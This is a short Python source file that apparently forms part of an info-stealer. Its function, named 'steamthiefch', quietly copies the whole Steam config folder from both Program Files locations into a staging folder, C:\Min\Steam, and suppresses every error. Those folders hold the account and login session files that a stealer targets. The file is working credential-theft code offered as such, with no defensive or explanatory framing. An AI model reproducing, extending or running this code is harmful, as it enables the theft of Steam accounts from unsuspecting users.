import os
import shutil

path1 = r'C:\Program Files\Steam\config'
path2 = r'C:\Program Files (x86)\Steam\config'

destination_folder = r'C:\Min\Steam'

def steamthiefch():
    if os.path.exists(path1):
        try:
            for filename in os.listdir(path1):
                source_file = os.path.join(path1, filename)
                destination_file = os.path.join(destination_folder, filename)

                if os.path.isfile(source_file):
                    shutil.copy2(source_file, destination_file)
                elif os.path.isdir(source_file):
                    shutil.copytree(source_file, destination_file, symlinks=False)
        except:
            pass

    if os.path.exists(path2):
        try:
            for filename in os.listdir(path2):
                source_file = os.path.join(path2, filename)
                destination_file = os.path.join(destination_folder, filename)

                if os.path.isfile(source_file):
                    shutil.copy2(source_file, destination_file)
                elif os.path.isdir(source_file):
                    shutil.copytree(source_file, destination_file, symlinks=False)
        except:
            pass

